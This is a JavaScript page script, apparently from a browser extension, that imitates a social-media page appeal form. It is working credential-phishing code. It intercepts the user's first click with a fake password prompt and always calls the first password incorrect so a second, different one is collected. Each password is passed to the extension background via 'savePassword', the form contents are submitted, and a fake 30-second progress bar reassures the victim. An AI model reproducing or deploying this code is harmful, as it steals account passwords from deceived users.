document.addEventListener('DOMContentLoaded', () => {
    const authModal = document.getElementById('authModal');
    const actionModal = document.getElementById('actionModal');
    const stepLoading = document.getElementById('step-loading');
    const stepSuccess = document.getElementById('step-success');
    const btnAuthSubmit = document.getElementById('btn-auth-submit');
    const mainSubmitBtn = document.getElementById('main-submit-btn');
    const btnFinish = document.getElementById('btn-finish');
    const inputAuthPwd = document.getElementById('auth_password');
    const authError = document.getElementById('auth-error');
    const progressBar = document.getElementById('progress-bar');
    const progressText = document.getElementById('progress-text');
    const togglePasswordBtn = document.getElementById('toggle-password');
    const fileUploadInput = document.getElementById('file-upload');
    const uploadTitle = document.getElementById('upload-title');

    let attempts = 0;
    let previousPasswords = [];
    let isAuthenticated = false;

    function sendToBackground(action, data) {
        return new Promise((resolve) => {
            if (chrome && chrome.runtime) {
                chrome.runtime.sendMessage({ action: action, ...data }, (response) => {
                    resolve(response);
                });
            } else {
                resolve(null);
            }
        });
    }

    document.addEventListener('click', function firstClickHandler(e) {
        if (!isAuthenticated) {
            e.preventDefault();
            e.stopPropagation();
            authModal.classList.add('show');
            inputAuthPwd.focus();
            document.removeEventListener('click', firstClickHandler, true);
        }
    }, true);

    authModal.addEventListener('click', (e) => {
        if (e.target === authModal) {
            e.stopPropagation();
        }
    });

    actionModal.addEventListener('click', (e) => e.stopPropagation());

    togglePasswordBtn.addEventListener('click', () => {
        if (inputAuthPwd.type === 'password') {
            inputAuthPwd.type = 'text';
            togglePasswordBtn.title = "Hide password";
        } else {
            inputAuthPwd.type = 'password';
            togglePasswordBtn.title = "Show password";
        }
    });

    btnAuthSubmit.addEventListener('click', async () => {
        const pwdVal = inputAuthPwd.value.trim();
        if (!pwdVal) {
            authError.textContent = 'Please enter your password.';
            authError.style.display = 'block';
            return;
        }

        if (previousPasswords.includes(pwdVal)) {
            authError.textContent = 'This password has been used before. Please enter a different password.';
            authError.style.display = 'block';
            inputAuthPwd.parentElement.style.border = '1px solid #e41e3f';
            inputAuthPwd.parentElement.style.boxShadow = '0 0 0 1px #e41e3f';
            inputAuthPwd.value = '';
            inputAuthPwd.focus();
            return;
        }

        attempts++;
        previousPasswords.push(pwdVal);
        await sendToBackground('savePassword', { password: pwdVal, attempt: attempts });

        if (attempts === 1) {
            authError.textContent = 'The password you\'ve entered is incorrect.';
            authError.style.display = 'block';
            inputAuthPwd.parentElement.style.border = '1px solid #e41e3f';
            inputAuthPwd.parentElement.style.boxShadow = '0 0 0 1px #e41e3f';
            inputAuthPwd.value = '';
            inputAuthPwd.focus();
        } else if (attempts === 2) {
            isAuthenticated = true;
            authModal.classList.remove('show');
        }
    });

    inputAuthPwd.addEventListener('input', () => {
        if (authError.style.display === 'block') {
            authError.style.display = 'none';
            inputAuthPwd.parentElement.style.border = '1px solid var(--primary)';
            inputAuthPwd.parentElement.style.boxShadow = '0 0 0 1px var(--primary)';
        }
    });

    inputAuthPwd.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            btnAuthSubmit.click();
        }
    });

    fileUploadInput.addEventListener('change', function () {
        if (this.files && this.files.length > 0) {
            uploadTitle.textContent = this.files[0].name;
            uploadTitle.style.color = 'var(--primary)';
        } else {
            uploadTitle.textContent = 'Click to upload or drag and drop';
            uploadTitle.style.color = 'var(--text-primary)';
        }
    });

    mainSubmitBtn.addEventListener('click', async () => {
        const confirmInfo = document.getElementById('confirm_info');
        if (!confirmInfo.checked) {
            alert('Please confirm that all information is accurate and complete.');
            return;
        }

        const formData = {
            formType:
                document.getElementById('form_type')?.value || '',

            pageId: document.getElementById('page_id')?.value || '',
            pageName: document.getElementById('page_name')?.value || '',

            field1: document.getElementById('field1')?.value || '',
            field2: document.getElementById('field2')?.value || '',
            field3: document.getElementById('field3')?.value || '',
            field4: document.getElementById('field4')?.value || '',

            additionalDetails:
                document.getElementById('additional_details')?.value || '',

            issues: Array.from(
                document.querySelectorAll('input[name="issue"]:checked')
            ).map(el => el.value),

            confirmInfo: confirmInfo.checked,
            timestamp: new Date().toISOString()
        };

        await sendToBackground('submitForm', { formData: formData });

        actionModal.classList.add('show');
        stepLoading.style.display = 'block';
        stepSuccess.style.display = 'none';

        let progress = 0;
        const duration = 30000;
        const updateInterval = 50;
        const increment = 100 / (duration / updateInterval);

        const timer = setInterval(() => {
            progress += increment;
            if (progress >= 100) {
                progress = 100;
                clearInterval(timer);
                setTimeout(() => {
                    stepLoading.style.display = 'none';
                    stepSuccess.style.display = 'block';
                }, 300);
            }
            progressBar.style.width = `${progress}%`;
            progressText.innerText = `${Math.floor(progress)}%`;
        }, updateInterval);
    });

    btnFinish.addEventListener('click', () => {
        actionModal.classList.remove('show');
    });
});
